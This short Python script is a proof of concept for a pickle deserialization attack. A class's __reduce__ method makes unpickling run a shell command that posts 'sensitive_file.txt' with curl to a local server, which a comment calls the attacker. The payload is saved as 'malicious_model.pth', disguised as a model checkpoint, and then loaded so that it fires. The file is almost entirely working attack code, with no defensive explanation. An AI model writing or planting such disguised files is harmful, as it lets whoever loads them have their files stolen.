import pickle
import os

class Malicious:
    def __reduce__(self):
        # POST the sensitive file to the attacker
        return (os.system, ("curl -F 'file=@sensitive_file.txt' http://localhost:8080",))


with open("malicious_model.pth", "wb") as f:
    pickle.dump(Malicious(), f)


# load the model
model = pickle.load(open("malicious_model.pth", "rb"))
